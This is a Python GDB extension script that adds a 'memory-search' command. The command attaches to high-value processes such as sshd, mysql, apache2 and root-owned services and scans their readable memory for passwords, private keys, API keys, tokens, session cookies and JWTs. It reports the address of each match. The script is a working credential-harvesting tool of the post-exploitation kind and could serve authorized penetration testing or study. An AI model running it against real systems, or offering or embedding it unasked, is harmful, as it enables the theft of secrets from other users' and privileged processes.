import os
import re
import subprocess
import gdb
import logging
import time

# Set up logging
logging.basicConfig(filename='memory_search.log', level=logging.DEBUG, format='%(asctime)s %(message)s')

class MemorySearch(gdb.Command):
    """Search memory for specific patterns in prioritized processes and report findings."""

    def __init__(self):
        super(MemorySearch, self).__init__("memory-search", gdb.COMMAND_USER)
        logging.debug("Initialized MemorySearch command")
        self.findings = []

    def invoke(self, args, from_tty):
        logging.debug("Invoke called with args: %s", args)
        args = gdb.string_to_argv(args)
        pattern = args[0] if len(args) > 0 else None

        # Find interesting PIDs
        pids = self.find_interesting_pids()

        if not pids:
            print("No interesting PIDs found.")
            logging.debug("No interesting PIDs found.")
            return

        # Perform memory search on each PID
        for pid in pids:
            print(f"Attaching to PID {pid}")
            logging.debug(f"Attaching to PID {pid}")
            if self.attach_and_search(pid, pattern):
                # Rate limiting to avoid overwhelming the system
                time.sleep(1)

        # Log summary of findings
        self.log_summary()

    def find_interesting_pids(self):
        """Find interesting PIDs on the system."""
        interesting_pids = set()
        prioritized_users = ['root', 'www-data']
        prioritized_apps = ['sshd', 'mysql', 'apache2']

        # Get PIDs of processes with network connections
        lsof_result = subprocess.run(['lsof', '-i', '-P', '-n', '-F', 'p'], stdout=subprocess.PIPE, text=True)
        logging.debug("lsof -i -P -n -F p output:\n%s", lsof_result.stdout)
        for line in lsof_result.stdout.splitlines():
            if line.startswith('p') and line[1:].isdigit():
                interesting_pids.add(int(line[1:]))

        # Get PIDs of resource-intensive processes
        ps_result = subprocess.run(['ps', '-eo', 'pid,user,comm,%cpu,%mem', '--sort=-%cpu,-%mem'], stdout=subprocess.PIPE, text=True)
        logging.debug("ps -eo pid,user,comm,%cpu,%mem --sort=-%cpu,-%mem output:\n%s", ps_result.stdout)
        for line in ps_result.stdout.splitlines()[1:]:  # Skip header line
            parts = line.split()
            if len(parts) < 5:
                continue
            pid, user, comm = parts[0], parts[1], parts[2]
            if pid.isdigit() and (user in prioritized_users or comm in prioritized_apps):
                interesting_pids.add(int(pid))

        logging.debug("Interesting PIDs: %s", interesting_pids)
        return list(interesting_pids)

    def attach_and_search(self, pid, pattern):
        """Attach to a process and search memory regions."""
        try:
            # Attach to the process
            gdb.execute(f"attach {pid}")

            # List memory mappings
            mappings = gdb.execute("info proc mappings", to_string=True)
            logging.debug("info proc mappings output for PID %d:\n%s", pid, mappings)
            memory_regions = self.parse_memory_mappings(mappings)

            # Search memory regions for the pattern or predefined patterns
            if pattern:
                patterns = [pattern]
            else:
                patterns = self.get_predefined_patterns()

            for region in memory_regions:
                for p in patterns:
                    self.search_memory_region(pid, region, p)

            # Detach from the process
            gdb.execute("detach")
            return True
        except gdb.error as e:
            print(f"Failed to attach to PID {pid}: {e}")
            logging.error("Failed to attach to PID %d: %s", pid, e)
            return False

    def parse_memory_mappings(self, mappings):
        """Parse memory mappings output from gdb."""
        memory_regions = []
        for line in mappings.splitlines():
            logging.debug("Parsing line: %s", line)
            parts = line.split()
            # Skip lines that don't have at least 6 parts or the lines that don't start with valid hexadecimal addresses
            if len(parts) >= 6 and self.is_valid_hex(parts[0]) and self.is_valid_hex(parts[1]):
                start_addr = int(parts[0], 16)
                end_addr = int(parts[1], 16)
                perms = parts[3]  # Adjusted to the correct index based on observed format
                logging.debug("Parsed memory region: start_addr=%s, end_addr=%s, perms=%s", parts[0], parts[1], perms)
                if 'r' in perms:
                    memory_regions.append((start_addr, end_addr))
        logging.debug("Parsed memory regions: %s", memory_regions)
        return memory_regions

    def is_valid_hex(self, s):
        """Check if a string is a valid hexadecimal number."""
        try:
            int(s, 16)
            return True
        except ValueError:
            logging.error("Invalid hex string: %s", s)
            return False

    def search_memory_region(self, pid, region, pattern):
        """Search a memory region for the pattern."""
        start_addr, end_addr = region
        size = end_addr - start_addr
        logging.debug("Searching memory region: start_addr=%s, end_addr=%s, size=%d", hex(start_addr), hex(end_addr), size)
        try:
            memory = gdb.selected_inferior().read_memory(start_addr, size)
            matches = re.finditer(pattern.encode(), memory)
            for match in matches:
                addr = start_addr + match.start()
                finding = f"Pattern '{pattern}' found in PID {pid} at address: {hex(addr)}"
                print(finding)
                logging.debug(finding)
                self.findings.append(finding)
        except gdb.MemoryError:
            print(f"Could not read memory region: {hex(start_addr)} - {hex(end_addr)}")
            logging.error("Could not read memory region: %s - %s", hex(start_addr), hex(end_addr))

    def get_predefined_patterns(self):
        """Return a list of predefined patterns to search for."""
        patterns = [
            r'password',
            r'passwd',
            r'key',
            r'secret',
            r'PRIVATE KEY',
            r'BEGIN RSA PRIVATE KEY',
            r'END RSA PRIVATE KEY',
            r'BEGIN OPENSSH PRIVATE KEY',
            r'END OPENSSH PRIVATE KEY',
            r'DB_PASSWORD',
            r'API_KEY',
            r'token',
            r'session',
            r'cookie',
            r'eyJhbGciOi',  # JSON web token (JWT) header for HS256
            r'eyJ0eXAiOi',  # JSON web token (JWT) header for JWS
            r'[A-Za-z0-9+/=]{40,}'  # Base64 encoded strings
        ]
        logging.debug("Predefined patterns: %s", patterns)
        return patterns

    def log_summary(self):
        """Log a summary of the findings."""
        summary = f"Memory search completed. Total findings: {len(self.findings)}\n"
        summary += "\n".join(self.findings)
        print(summary)
        logging.debug(summary)

MemorySearch()
